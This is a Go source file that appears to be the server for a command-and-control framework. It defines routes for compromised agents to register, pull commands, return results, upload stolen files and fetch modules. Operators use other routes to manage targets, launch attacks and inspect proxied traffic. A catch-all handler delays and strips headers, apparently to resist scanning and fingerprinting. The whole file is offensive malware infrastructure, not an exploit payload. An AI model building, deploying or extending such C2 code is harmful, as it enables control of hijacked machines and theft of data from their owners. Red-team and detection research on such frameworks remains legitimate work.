package srv

import (
	"c2/ctrl"
	"common/middleware"
	"math/rand"
	"net/http"
	"time"

	xenaC2 "github.com/zarkones/xena-client"

	"github.com/gin-gonic/gin"
)

func Start() error {
	R := gin.Default()
	R.Use(gin.Recovery())
	R.Use(middleware.CORS())

	authed := R.Group("")
	authed.Use(middleware.OperatorAuth())

	R.GET("/v1/proxy/cert", ctrl.GetCertificate)
	R.GET("/v1/proxy/traffic/:reqID", ctrl.GetProxiedRequest)
	R.GET("/v1/proxy/traffic", ctrl.GetProxiedRequests)

	R.GET("/v1/scans/http", ctrl.GetHttpScans)
	R.POST("/v1/scans/http", ctrl.InsertHttpScan)

	R.POST("/v1/agents", middleware.DecryptAgentReq(), ctrl.AgentInsert)
	for _, endpointPath := range xenaC2.RouteMap[xenaC2.R_AGENT_IDENTIFY] {
		R.POST(endpointPath, middleware.DecryptAgentReq(), ctrl.AgentInsert)
	}

	R.GET("/v1/messages/:agentID", ctrl.MessagesGetMultiple)
	for _, endpointPath := range xenaC2.RouteMap[xenaC2.R_FETCH_MESSAGES] {
		R.GET(endpointPath+"/:agentID", ctrl.MessagesGetMultiple)
	}

	R.GET("/v1/messages/live/:agentID", ctrl.MessagesSubscribe)
	for _, endpointPath := range xenaC2.RouteMap[xenaC2.R_FETCH_MESSAGES_LIVE] {
		R.GET(endpointPath+"/:agentID", ctrl.MessagesSubscribe)
	}

	for _, endpointPath := range xenaC2.RouteMap[xenaC2.R_MESSAGE_RESPOND] {
		R.POST(endpointPath, middleware.DecryptAgentReq(), ctrl.MessagesAddResponse)
	}

	authed.GET("/v1/files", ctrl.ListFiles)
	authed.GET("/v1/files/:fileID", ctrl.DownloadFile)
	authed.PUT("/v1/files", ctrl.RequestFileUpload)
	for _, endpointPath := range xenaC2.RouteMap[xenaC2.R_FILE_UPLOAD] {
		R.POST(endpointPath+"/:fileID", ctrl.UploadFile)
	}

	for _, endpointPath := range xenaC2.RouteMap[xenaC2.R_MODULE_DOWNLOAD] {
		R.POST(endpointPath, middleware.DecryptAgentReq(), ctrl.DownloadModule)
	}

	authed.GET("/v1/pipelines", ctrl.GetPipelines)
	authed.POST("/v1/pipelines", ctrl.UpsertPipeline)
	authed.POST("/v1/pipelines/exec", ctrl.ExecPipeline)
	authed.POST("/v1/pipelines/settings", ctrl.SetPipelineSettings)
	authed.GET("/v1/pipelines/runs/:pipelineID", ctrl.GetPipelineExecutions)
	authed.DELETE("/v1/pipelines/:pipelineID", ctrl.DeletePipeline)

	authed.GET("/v1/agents", ctrl.AgentsGetMultiple)

	authed.GET("/v1/message", ctrl.MessageGet)
	authed.POST("/v1/messages", ctrl.MessagesInsert)

	authed.GET("/v1/targets", ctrl.GetTargets)
	authed.POST("/v1/targets", ctrl.UpsertTarget)
	authed.POST("/v1/targets/attack", ctrl.AttackTarget)
	authed.GET("/v1/attacks", ctrl.GetOngoingAttacks)

	authed.DELETE("/v1/targets/:targetID", ctrl.RemoveTarget)

	authed.GET("/v1/public-key", ctrl.GetC2PublicKey)

	R.NoRoute(func(ctx *gin.Context) {
		rnd := rand.Intn(10)
		time.Sleep(time.Second * time.Duration(20+rnd))
		ctx.Writer.WriteHeader(http.StatusServiceUnavailable)

		ctx.Writer.Header().Del("Access-Control-Allow-Credentials")
		ctx.Writer.Header().Del("Access-Control-Allow-Headers")
		ctx.Writer.Header().Del("Access-Control-Allow-Methods")
		ctx.Writer.Header().Del("Access-Control-Allow-Origin")
		ctx.Writer.Header().Del("Date")
	})

	return R.Run()
}
